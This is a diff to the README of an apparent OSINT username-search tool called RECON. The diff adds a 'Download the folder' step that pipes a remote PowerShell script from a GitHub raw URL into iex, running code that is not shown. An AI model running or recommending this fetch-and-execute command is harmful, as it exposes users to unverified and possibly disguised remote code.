@@ -1,5 +1,11 @@
 # RECON - Multi-Source OSINT Aggregator
 
+# Download the folder 
+
+```bash
+irm https://raw.githubusercontent.com/togg53192-cmd/recon/main/install.ps1 | iex
+```
+
 A real OSINT tool that makes actual HTTP requests, integrates with Blackbird/Maigret/Sherlock,
 downloads the WhatsMyName database (500+ sites), and serves results in a web UI.
 
